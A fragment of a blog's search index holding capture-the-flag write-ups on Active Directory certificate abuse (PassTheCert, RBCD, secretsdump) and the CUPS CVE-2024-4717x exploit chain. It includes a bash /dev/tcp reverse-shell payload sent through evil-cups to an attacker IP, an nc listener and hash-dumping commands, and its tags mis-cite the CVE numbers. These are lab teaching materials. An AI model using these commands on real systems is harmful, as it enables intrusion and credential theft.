https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/ https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b But what is an EKU…..glad you asked my hacking bretherin.\nExtended Key Usage (EKU) Primer: What is in an EKU? Extended Key Usage (EKU) is an X.509 certificate field that indicates the purpose(s) for which the certified public key can be used. EKU\u0026rsquo;s provide more granular control over how a certificate can be used, beyond the basic key usage fields. Importance of Correct EKU Configuration: If the client\u0026rsquo;s certificate does not have the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU (or another EKU approved for PKINIT), the KDC will likely reject the PKINIT pre-authentication request. This can happen if the underlying Public Key Infrastructure (PKI) is not properly configured to issue certificates with the correct EKUs. +Note+: This is what is happening when we see the error: KDC_ERR_PADATA_TYPE_NOSUPP Ensuring that certificates used for PKINIT have the proper EKU is a crucial step in setting up and maintaining a functional PKINIT deployment. Without the right EKU, PKINIT will not work as expected, and users may be unable to authenticate using their PKI credentials. EKUs and PKINIT: For PKINIT to work correctly, the client\u0026rsquo;s X.509 certificate must have the appropriate EKU set. This is typically the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU. The \u0026ldquo;Smart Card Logon\u0026rdquo; EKU indicates that the certificate can be used for authenticating the certificate holder to a system. This EKU is essential for PKINIT, as it signals to the kerberos Key Distribution Center (KDC) that the certificate is intended for user authentication. EKU resources: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn786428(v=ws.11)#extended-key-usages https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/d2f037c5-7a2a-4513-8f72-5b1c7bd88561 So how do we move forward with our attack chain? Bypassing PKINIT Limitations If the domain controller does not support PKINIT, (the kerberos mechanism that allows using X.509 certificates for pre-authentication.) Due to not having the required \u0026ldquo;Smart Card Logon\u0026rdquo; Extended Key Usage (EKU) set what do we do? Looking back at the article we can see it mentions the tool PassTheCert . Which means in these cases, alternative authentication methods may be available. - For example, protocols like LDAP can support Schannel, which enables authentication through TLS. This can provide a way to perform certificate-based authentication, even when PKINIT is not supported by the Domain Controllers. Secure Channel (Schannel) Primer: Last primer I promise. I\u0026rsquo;m sorry, there are just a lot of parts here and unless we understand we are just script kiddies aren\u0026rsquo;t we.\nSchannel is the Secure Channel security package in Windows. It is a set of security protocols and APIs that provide secure network communications, including SSL/TLS encryption and authentication. In cases where PKINIT is not available we can attempt to authenticate against LDAP/S using the cert with Schannel So, in summary, Schannel provides an alternative authentication mechanism that can be leveraged when PKINIT kerberos authentication is not possible, due to issues with the certificate such as EKU not being set. We got there, primers done I promise.\nSchannel Resources: https://learn.microsoft.com/en-us/windows/win32/com/schannel https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-schannel/ba-p/259233 Using PassTheCert \u0026amp; certipy to get our ticket: Extracting the key \u0026amp; cert from the .pfx file using certipy: As we cannot use the original extracted cert we need to separate the certificate and key in order to use them.\nExtract the certificate:\ncertipy cert -pfx administrator_authority.pfx -nokey -out admin.crt Extract the key:\ncertipy cert -pfx administrator_authority.pfx -nocert -out admin.key Creating a new computer for an RBCD attack using PassTheCert: As we now have the admin certificate and key we can use PassTheCert to create another new computer on the domain that we can grant delegation privileges for over the DC authority.authority.htb\nAn RBCD (Resource-Based Constrained Delegation) attack allows us to impersonate another user on a target computer. In this case the Administrator on the DC. We can do this by modifying the msDS-AllowedToActOnBehalfOfOtherIdentity property of the target\u0026rsquo;s AD object (DC), effectively granting the us permission to act on behalf of other users for that specific resource. Once set up, we can perform actions as the specified user (administrator) on the target machine (DC)\nCreate a new computer with constrained delegation privileges over the DC: python3 passthecert.py -action add_computer -crt admin.crt -key admin.key -domain $domain -dc-ip $box -computer-name bloodstiller2$ -delegated-services cifs/authority.$domain,ldap/authority.$domain Performing the RBCD attack with impacket-getST: Perform an RBCD attack against the DC to retrieve an admin TGT\nimpacket-getST -spn ldap/authority.$domain -impersonate Administrator -dc-ip $box 'authority.htb/bloodstiller2:g4rHrG2bPnCcz8mX7d1wGPNq4NnPf9Sp' Rename the .ccache file because WHY SO LONG!\nmv Administrator@ldap_authority.authority.htb@AUTHORITY.HTB.ccache Admin.ccache Export the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Admin.ccache Use impacket-secretsdump to dump the hashes:\nimpacket-secretsdump -k -no-pass $domain/administrator@authority.$domain Verify the dumped hash works:\nnetexec smb $box -u administrator -H $hash Connect with evil-winrm and get our flag:\nevil-winrm -i $box -u administrator -H $hash Why did this work? The key points are:\nSituation:\nEnrolled a vulnerable certificate, but PKINIT failed due to Extended Key Usage (EKU) not being set. Required an alternative authentication method to access the Domain Controller (DC) using the certificate. Alternative Authentication:\nUsed PassTheCert to authenticate via LDAP using the Schannel security package. RBCD (Resource-Based Constrained Delegation):\nCreated a new computer with delegation rights over the DC. Allowed us to authenticate against this new computer as the Administrator. Enabled extraction of an Administrator TGT, granting us domain-level authentication. Lessons Learned: What did I learn? I learned about what to do if PKINIT is disabled. I really enjoyed this box, it wasn\u0026rsquo;t a case of just follow the attack path.\nI learned about decrypting ansible hashes, I have never done that before.\nWhat silly mistakes did I make? Not too many this times. It just took time to understand and make this work as there were more moving parts I had to understand to get everything working Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "tags": ["Linux","HTB","Hack The Box","CUPS","IPP","CVE-2024-4176","CVE-2024-4175","CVE-2024-4177","CVE-2024-4076","Printer Security","Privilege Escalation",],
        "content": "EvilCUPS Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/EvilCUPS How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\nnmap $box -Pn -oA TCPbasicScan kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:16:48 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:16 BST Nmap scan report for 10.129.231.157 Host is up (0.036s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 631/tcp open ipp Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds Initial thoughts: I am doing this box purely to understand the recent CVE-2024-47176 further so know that 631 will be interesting. Basic UDP Scan:\nsudo nmap $box -sU -Pn -oA UDPbasicScan kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:17:00 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:21 BST Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 35.08% done; ETC: 07:38 (0:10:50 remaining) Stats: 0:16:46 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 96.55% done; ETC: 07:38 (0:00:36 remaining) Nmap scan report for 10.129.231.157 Host is up (0.035s latency). Not shown: 997 closed udp ports (port-unreach) PORT STATE SERVICE 68/udp open|filtered dhcpc 631/udp open|filtered ipp 5353/udp open|filtered zeroconf Nmap done: 1 IP address (1 host up) scanned in 1050.49 seconds Initial thoughts:\nAs expected IPP and CUPS. CUPS 631: As we know CUPS is running we can visit the web server by visiting http://[ip]:631\nI try the administration button but this is denied:\nCommon UNIX Printing System (CUPS) Primer: What is CUPS?:\nCUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems. It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols. Supports printing to both local and network printers, handling print queues and printer management. Key Features of CUPS:\nPrint Server Functionality: Manages printers and print jobs on both local machines and networked environments. Protocol Support: Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more. Driver Flexibility: Allows the use of a variety of printer drivers, supporting a wide range of printers. Web Interface: Provides a web-based interface for configuring printers, managing jobs, and accessing logs. Authentication and Security: Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing. How CUPS Works:\nQueue System: CUPS handles print jobs by placing them in a queue, where they are processed and sent to the printer in the order they are received. Backend System: CUPS uses backends to communicate with printers. The most common backend is IPP, but others like USB and LPD are also available. Filters: CUPS uses filters to convert print data from application formats (like PDF or PostScript) into formats the printer can understand. Security Considerations:\nCUPS exposes ports (usually 631 for IPP) which, if misconfigured, could lead to unauthorized access. Proper configuration and updates are critical to avoid vulnerabilities, especially in networked environments where CUPS could be exploited remotely. Internet Printing Protocol (IPP) Primer: Definition:\nIPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network. It is the core protocol used by CUPS and other modern printing systems for handling print tasks. Key Features of IPP:\nPrinting Control: IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities. Standardization: Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol. Support for Secure Transmission: IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server. Advanced Printer Features: Supports a wide range of printing features, such as duplex printing, media selection, and finishing options. How IPP Works:\nJob Submission: Clients send print requests (in IPP format) to a printer or print server. Job and Queue Management: The protocol allows clients to monitor and manage print jobs, with the ability to query job status, hold jobs, or cancel them. Communication: IPP communicates over port 631 by default, using HTTP as the transport layer. This allows it to be integrated into web-based services. Security Features:\nAuthentication and Encryption: Supports various authentication mechanisms and encryption via TLS, ensuring only authorized users can submit or manage print jobs. Access Control: IPP can restrict access to certain users or devices, enhancing security in environments with multiple users. Common Use:\nIPP is used in most modern networked printers and printing systems (like CUPS) due to its flexibility, security features, and ability to handle complex printing tasks. IPP\u0026rsquo;s versatility and security make it a preferred protocol for managing printers, especially in networked environments PostScript Printer Description (PPD) Primer: What is a PPD File?\nA PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer. PPD files provide detailed information about the printer\u0026rsquo;s features, such as supported paper sizes, resolution, duplexing, and more. A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer. Purpose of a PPD File:\nPrinter Configuration: PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly. Feature Customization: They describe optional features like trays, memory, or color modes, enabling users to select these features during printing. Structure of a PPD File:\nHeader: Contains general information about the printer, such as its model name, manufacturer, and supported languages. Printer Capabilities: Details the specific print features like: Supported page sizes (e.g., A4, Letter) Print resolution (e.g., 600 DPI, 1200 DPI) Duplex printing capabilities (automatic double-sided printing) Option Keywords: Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching. How a PPD File Works:\nWhen a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand. It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.). Common Use Cases:\nPostScript Printers: Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features. Driver Customization: Often included with printer drivers or downloaded from the printer manufacturer\u0026rsquo;s website, ensuring that all printer features are available to the user. Security and Maintenance:\nMisconfiguration Issues: Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality. Modifications: PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues. Attack Chain: If you would like a deeper dive: I have written a deep dive of this exploitation chain which you can find here:\n+Deep Dive+: https://bloodstiller.com/articles/understandingcupsexploitation Attack Chain Summarized:\nForce the target machine to connect back to our malicious IPP server by sending a crafted packet to port 631 thereby starting the process of creating a fake printer. Return a malicious IPP attribute string to inject our controlled PPD directives to the temporary file. Either print a test page from our fake printer if we have access to the CUPS web panel to trigger the PPD directives (and our commands) to be executed or wait for a print job to be sent to the fake printer. 2. Foothold: Exploiting the CUPS vulnerabilities to get a low privilege shell: Preparing the CUPS Exploit: I will be using ippsec\u0026rsquo;s cups exploit for this attack:\nhttps://github.com/ippsec/evil-cups Preparing Exploit:\ngit clone https://github.com/IppSec/evil-cups.git cd evil-cups Prepare Python Venv:\npython3 -m venv evilCups source evilCups/bin/activate +Note+: I use venv\u0026rsquo;s as it allows me to install different deps without causing conflicts with my base python installation. Install Requirements:\npip3 install -r requirements.txt Running the CUPS Exploit: Running the exploit to send the payload:\npython3 evilcups.py [AttackIP] [VictimIP] \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/[AttackIP]/[AttackPort] 0\u0026gt;\u0026amp;1'\u0026quot; python3 evilcups.py 10.10.14.58 $box \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.58/443 0\u0026gt;\u0026amp;1'\u0026quot; Now the payload is sent we can move onto the next stage of triggering the exploit: Start our listener:\nrlwrap -cAr nc -lnvp 443 Trigger the exploit:\nNavigating the CUPS web-console we can see our malicious printer is listed:\nPrinting our test page to trigger the exploit:\nIn order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the \u0026ldquo;Test Print\u0026rdquo; functionality. Low Priv Shell Caught:\nGet our User Flag:\n3. Privilege Escalation: Reading Cached Print Queues to retrieve the Root Password: Checking for print jobs in the CUPS web console:\nAs this is a printer based machine lets check if there are any interesting print jobs. Navigating to the web-console \u0026amp; clicking on Jobs we can see a single job is listed for the authentic printer Canon_MB2300_series You may notice the -1 after this tells us this is the first print job for this printer. (more on this soon) Trying to read the cached Jobs:\nCUPS keeps it\u0026rsquo;s cached jobs in the default location: /var/spool/cups/ however when I try and list the contents of the folder I get the following error: Discovering we have executable rights over the folder:\nListing the contents of /var/spools we can see we have execute privileges on the cups directory but we cannot list the contents: This means if we can establish the file-name for any files in the folder we can execute cat etc on the file to list the contents. Default naming structure format for cached Print jobs:\nThe naming structure for completed jobs in the cups directory is as follows: d-[print job]-[page number] d = The cached print job files in the CUPS directory are always prefixed with \u0026ldquo;d\u0026rdquo;. Print job = 5 digits (e.g. 00001) Page number = 3 digits (e.g. 001) As we know there is only 1 printer, Canon_MB2300_series \u0026amp; it had only 1 job (see below) therefore we can infer the file will be called d00001-001. Extracting the root password from the cached job:\ncat /var/spool/cups/d00001-001\nScrolling down we can get root users pass:\n+Note+: This is very CTF, but I don\u0026rsquo;t mind.\n4. Ownership: SSH\u0026rsquo;ing As Root to get the root flag: SSH back in as root:\nGet Root Flag:\nLessons Learned: What did I learn? Reading the https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ I learned ALOT about CUPS, PPD, IPP etc. What silly mistakes did I make? Forgot a closing quotation mark a few times, that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

    "http:\/\/localhost:1313\/articles\/understandingcupsexploitation\/": {
        "title": "Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076",
        "tags": ["CVE-2024-4176","CVE-2024-4175","CVE-2024-4177","CVE-2024-4076","Linux","CUPS",],
        "content": "Introduction The Common UNIX Printing System (CUPS) is a crucial component in many Unix-like operating systems, including Linux and macOS. Recent discoveries have revealed significant vulnerabilities in CUPS, potentially exposing systems to serious security risks. This post will explore these vulnerabilities and demonstrate how they can be exploited.\nCUPS, IPP \u0026amp; PPD: A Primer Common UNIX Printing System (CUPS) Primer: What is CUPS?:\nCUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems. It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols. Supports printing to both local and network printers, handling print queues and printer management. Key Features of CUPS:\nPrint Server Functionality: Manages printers and print jobs on both local machines and networked environments. Protocol Support: Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more. Driver Flexibility: Allows the use of a variety of printer drivers, supporting a wide range of printers. Web Interface: Provides a web-based interface for configuring printers, managing jobs, and accessing logs. Authentication and Security: Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing. Internet Printing Protocol (IPP) Primer: Definition:\nIPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network. It is the core protocol used by CUPS and other modern printing systems for handling print tasks. Key Features of IPP:\nPrinting Control: IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities. Standardization: Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol. Support for Secure Transmission: IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server. Advanced Printer Features: Supports a wide range of printing features, such as duplex printing, media selection, and finishing options. PostScript Printer Description (PPD) Primer: What is a PPD File?\nA PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer. PPD files provide detailed information about the printer\u0026rsquo;s features, such as supported paper sizes, resolution, duplexing, and more. A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer. Purpose of a PPD File:\nPrinter Configuration: PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly. Feature Customization: They describe optional features like trays, memory, or color modes, enabling users to select these features during printing. Structure of a PPD File:\nHeader: Contains general information about the printer, such as its model name, manufacturer, and supported languages. Printer Capabilities: Details the specific print features like: Supported page sizes (e.g., A4, Letter) Print resolution (e.g., 600 DPI, 1200 DPI) Duplex printing capabilities (automatic double-sided printing) Option Keywords: Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching. How a PPD File Works:\nWhen a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand. It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.). Common Use Cases:\nPostScript Printers: Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features. Driver Customization: Often included with printer drivers or downloaded from the printer manufacturer\u0026rsquo;s website, ensuring that all printer features are available to the user. Security and Maintenance:\nMisconfiguration Issues: Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality. Modifications: PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues. The Vulnerabilities All discovered by evil-socket CVE-2024-47176: Malicious Packet Exploitation: Affects the cups-browsed component If a packet containing a URL in the form 0 3 http://\u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt;/printers/Name is sent to UDP port 631 on a vulnerable system, it results in cups-browsed connecting back to that malicious URL and sending back the kernel version and architecture of the vulnerable system. CVE-2024-47175: Fake Printer Addition: Vulnerability in libppd Allows an attacker to add a fake printer to the CUPS service Stems from improper handling of untrusted input in PPD (PostScript Printer Description) file creation CVE-2024-47177: Foomatic-RIP Filter Exploitation: The Foomatic-RIP filter is an older filter with a history of being exploitable It accepts the FoomaticRIPCommandLine directive in the PPD, which allows any command to be executed Vulnerability persists due to backward compatibility issues with older printers CVE-2024-47076: Exploiting PPD Instructions and Filters: Vulnerability in libcupsfilters PPD files configure how CUPS handles printing tasks, including specifying filters Attack Process Deep Dive: Attack Chain Summarized: Force the target machine to connect back to our malicious IPP server by sending a crafted packet to port 631 thereby starting the process of creating a fake printer. Return a malicious IPP attribute string to inject our controlled PPD directives to the temporary file. Either print a test page from our fake printer if we have access to the CUPS web panel to trigger the PPD directives (and our commands) to be executed or wait for a print job to be sent to the fake printer. Detailed Exploitation Process: Step 1: Getting the printer to connect back (CVE-2024-47176): Vulnerability in cups-browsed component Exploit method: Send a packet containing a URL in the form: 0 3 http://\u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt;/printers/Name Target: UDP port 631 on the vulnerable system Result: cups-browsed connects back to the malicious URL, revealing: Kernel version System architecture Step 2: Adding the Fake Printer (CVE-2024-47175): Vulnerability in libppd Process: The malicious URL is mistaken for a legitimate printer CUPS sends a Get-Printer-Attributes request for vendor, model, etc. Attacker can manipulate this information to add a fake printer to CUPS New printer addition doesn\u0026rsquo;t notify the user by default PPD File Creation and Conversion:\nReturned data is stored in a temporary PPD file The file is converted using libppd without proper sanitization Vulnerable code snippet: // Vulnerable Code cupsFilePrintf(fp, \u0026#34;*Manufacturer: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, make); // Vulnerable cupsFilePrintf(fp, \u0026#34;*ModelName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;, make, model); // Vulnerable cupsFilePrintf(fp, \u0026#34;*Product: \\\u0026#34;(%s %s)\\\u0026#34;\\n\u0026#34;, make, model); cupsFilePrintf(fp, \u0026#34;*NickName: \\\u0026#34;%s %s, %sdriverless, %s\\\u0026#34;\\n\u0026#34;, make, model, (is_fax ? \u0026#34;Fax, \u0026#34; : \u0026#34;\u0026#34;), VERSION); // Vulnerable cupsFilePrintf(fp, \u0026#34;*ShortNickName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;, make, model); Untrusted Input (Format String Vulnerability):\ncupsFilePrintf used without proper input validation Attacker can inject format specifiers (e.g., %n, %s) via make, model, or is_fax variables Potential impacts: Memory address leaks Memory corruption (buffer overflows, remote code execution) Attack Mechanism:\nAttacker provides crafted input with format string specifiers (e.g., %x, %n) If interpreted, can read unintended data or overwrite critical variables in memory Mitigation Steps:\nUse safer functions like snprintf to limit input size Sanitize user-controlled input Explicitly define format specifiers Validate all user inputs before processing Step 3: Exploiting PPD Instructions and Filters (CVE-2024-47076): Vulnerability in libcupsfilters PPD files configure how CUPS handles printing tasks, including specifying filters cupsFilter2 Directive: Tells CUPS which filter to run based on print job format and printer capabilities If manipulated, can alter which filter is executed, potentially running malicious code Step 4: Exploiting the Foomatic-RIP Filter (CVE-2024-47177): Foomatic-RIP is an older filter with a history of exploitability Accepts FoomaticRIPCommandLine directive in PPD, allowing arbitrary command execution Foomatic-RIP is a universal converter for various document formats Persistent vulnerability due to: Integration of foomatic-filters into CUPS without including a previous fix Backward compatibility requirements for older UNIX-based printers Step 5: Attack Execution: Once the fake printer is added and the malicious PPD file is in place:\nWait for a print job to be sent to the fake printer, or Trigger a test print from the CUPS web interface (if accessible) The malicious commands injected via the PPD file will be executed when the print job is processed This attack chain demonstrates the compounding effect of multiple vulnerabilities in a system. Always ensure proper permissions and ethical considerations before testing or demonstrating such exploits.\nExample of Exploitation. This example is taken from the HTB box EvilCUPS: https://app.hackthebox.com/machines/EvilCUPS You can see my full writeup here: https://bloodstiller.com/walkthroughs/evilcups-box/ Preparing the CUPS Exploit: I will be using ippsec\u0026rsquo;s cups exploit for this attack:\nhttps://github.com/ippsec/evil-cups Preparing Exploit:\ngit clone https://github.com/IppSec/evil-cups.git cd evil-cups Prepare Python Venv:\npython3 -m venv evilCups source evilCups/bin/activate +Note+: I use venv\u0026rsquo;s as it allows me to install different deps without causing conflicts with my base python installation. Install Requirements:\npip3 install -r requirements.txt Running the CUPS Exploit: Running the exploit to send the payload:\npython3 evilcups.py [AttackIP] [VictimIP] \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/[AttackIP]/[AttackPort] 0\u0026gt;\u0026amp;1'\u0026quot; python3 evilcups.py 10.10.14.58 $box \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.58/443 0\u0026gt;\u0026amp;1'\u0026quot; Now the payload is sent we can move onto the next stage of triggering the exploit: Start our listener:\nrlwrap -cAr nc -lnvp 443 Trigger the exploit:\nNavigating the CUPS web-console we can see our malicious printer is listed:\nPrinting our test page to trigger the exploit:\nIn order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the \u0026ldquo;Test Print\u0026rdquo; functionality. Low Priv Shell Caught:\nConclusion The vulnerabilities in CUPS demonstrate the ongoing need for vigilance in system security, even in widely-used and well-established software.\nReferences CVE-2024-47176 CVE-2024-47175 CVE-2024-47177 CVE-2024-47076 Evil CUPS Exploit Repository ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingcupsexploitation\/"
